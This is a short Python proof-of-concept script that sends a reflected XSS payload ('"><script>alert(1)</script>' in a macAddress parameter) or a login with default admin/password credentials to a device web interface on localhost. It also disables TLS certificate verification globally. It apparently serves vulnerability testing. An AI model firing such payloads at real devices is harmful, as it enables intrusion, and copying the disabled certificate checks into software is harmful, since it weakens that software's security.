# Sends a predefined XSS/login HTTP-request to localhost.

import argparse
import urllib.parse
import urllib.request
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

# Login to the device
def login(url):
  url = url + '/login.php'
  params = {'username' : 'admin',
    'password' : 'password',
    'id' : '870406' }

  data = urllib.parse.urlencode(params)
  data = data.encode('ascii')
  r = urllib.request.urlopen(url, data=data)
  print('Response from the server: ' + str(r.status))

# Send the attack
def attack(url):
  payload = '?/boardData103?macAddress="><script>alert(1)</script>'
  try:
    r = urllib.request.urlopen(url + payload)
    print('Response from the server: ' + str(r.status))
  except urllib.error.HTTPError as e:
    print('Error, response from the server: ' + str(e.status))
    
# Parse url, read args and execute the script
def main():
  if args.https:
    url = 'https://localhost:' + str(args.port)
  else:
    url = 'http://localhost:' + str(args.port)

  if args.mode == 'xss':
    attack(url)
  else:
    login(url)

# Define the command line parser     
if __name__ == "__main__":
  parser = argparse.ArgumentParser(
    description='Sends a predefined XSS/login -script to localhost.')
  parser.add_argument('mode',
    type=str,
    choices=['xss', 'login'],
    help='Choses the script mode.')
  parser.add_argument('port',
    type=int, 
    help='Chooses the port: <port>')
  parser.add_argument(
    '--https',
    action='store_true',
    help='Sets HTTPS when loggin in.')
  args = parser.parse_args()

  main()
